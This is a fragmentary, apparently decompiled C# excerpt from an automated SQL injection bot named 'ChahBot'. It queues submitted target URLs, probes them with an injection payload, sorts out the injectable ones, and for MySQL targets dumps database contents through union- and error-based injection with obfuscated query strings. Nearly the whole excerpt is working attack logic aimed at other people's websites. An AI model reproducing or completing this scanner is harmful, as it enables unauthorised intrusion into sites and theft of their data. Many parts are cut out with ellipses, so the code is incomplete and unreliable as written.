...
namespace ChahBot_1_0_Gacy.Controller
{
    class InjecterUrlsQueue
    {
        ...
        private struct stAnalizerUrl
        {
            public string Url;
            public Types Method;
            public string IP_Submitter;
            public string Email_Submitter;
        }
        ...
        public Hashtable __QUEUE__ = new Hashtable();
        public Hashtable __INJECATBLES__ = new Hashtable();
        public Hashtable __NON_EXPLOITABLES__ = new Hashtable();
        public Hashtable __NON_INJECTABLES__ = new Hashtable();
        ...
        public InjecterUrlsQueue()
        {
            __QUEUE__ = new Hashtable();
        ...
        public void StartWorker(dynamic order, Hashtable Urls_queue, int TimeOut = 15000, int numHttpDelay = 100, int nbrThread = 1)
        {
            __QUEUE__ = Urls_queue;
            if (__RunningWorker)
            {
                return;
            }
            checked
            {
                ...
                Globals.UpDateStatus(__Analizer.Order, "Analyser QUEUE", "Scanner thread, loading please wait..");

                if (true)
                {
                    if (Urls_queue.Values.Count == 0)
                    {
                        Globals.UpDateStatus(__Analizer.Order, "Analyser QUEUE", "Analizer thread, no available URL's to analize.");
                        Interaction.Beep();
                        return;
                    }
                    try
                    {
                        foreach (dynamic dObj in __QUEUE__.Values)
                        {
                            stAnalizerUrl item = default(stAnalizerUrl);
                            item.Url = Convert.ToString(dObj.url);
                            item.Method = Utls.StringToType(dObj.sql_type);
                            item.IP_Submitter = dObj.ip_submitter;
                            item.Email_Submitter = dObj.email_submitter;
                    ...
                    if (list2.Count == 0)
                    {
                        Globals.UpDateStatus(__Analizer.Order, "Analyser QUEUE", "Get Server Info thread, no URL seleted.");
                        Interaction.Beep();
                        return;
                    }
                }
                ...
                {
                    Globals.UpDateStatus(__Analizer.Order, "Analyser QUEUE", "Analizer thread, Union and Error basead un-checked!");
                    Interaction.Beep();
                    return;
                }
                if (list2.Count == 0)
                {
                    Globals.UpDateStatus(__Analizer.Order, "Analyser QUEUE", "Analizer thread, the URL's is not compatible with the parameters to analize.");
                    Interaction.Beep();
                    return;
                }
		        ...
		        try
		        {
			        ...
			        try
			        {
				        ...
				        while (enumerator.MoveNext())
				        {
					        ...
					        if (num > 1)
					        {
						        Globals.UpDateStatus(__Analizer.Order, "Analyser QUEUE", string.Concat(new string[]
						        {
							        "[",
	    ...
	    private void bckAnalizer_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	    {
            ...
            Globals.UpDateStatus(__Analizer.Order, "Analyser QUEUE", "Analizer thread done, injectable detected: " + this.GetInjectableSummary());
            Globals.GUI.sendInjectables(__Analizer.Order, __INJECATBLES__);
	    }
        ...
        private bool ScannerExploit(string sUrl)
        {
            bool flag = false;
            string sType = "";
            HTTP http = new HTTP(15000);
            try
            {
                Types types = new Types();
                List<string> list = Analizer.BuildTraject(sUrl, "'A=0", true);
                using (List<string>.Enumerator enumerator = list.GetEnumerator())
                {
                    ...
                    Label_004F:
                        string sPostData = "";
                        string sErrDesc = "";
                        string str = http.GetHTML(current, enHTTPMethod.GET, ref sPostData, null, null, false, ref sErrDesc, true);
        ...
        private void AddURL(string sURL, params string[] sValues)
        {
            ...
            if (!__INJECATBLES__.ContainsKey(sURL))
            {
                ...
                Globals.GUI.sendInjectable(this.__Analizer.Order, list);
					    ...
					    case Types.MySQL_With_Error:
					    {
						    ...
						    if (oType == Types.MySQL_No_Error)
						    {
							    ...
							    while (true)
							    {
								    ...
								    string sUrlCurrent = MySQLNoError.Dump(sBuilUrl, unchecked(((bMSSQLCollateLatin) )) ? MySQLCollactions.UnHex : MySQLCollactions.None, false, false, "", "", list3, i, 1, "", "", "", text3);
								    Globals.G_Tools.CheckSQLiStringOfuscation(ref sUrlCurrent);
								    if (this.AnalizerCheckForCancel())
								    {
									    break;
								    }
								    HTTP http = hTTP;
								    enHTTPMethod method = enHTTPMethod.GET;
								    string sPostData = "";
								    object oCookie = null;
								    NetworkCredential oCredientatial = null;
								    bool debugable = true;
								    string sErrorStr = "";
                                    string hTML = http.GetHTML(sUrlCurrent, method, ref sPostData, oCookie, oCredientatial, debugable, ref sErrorStr);
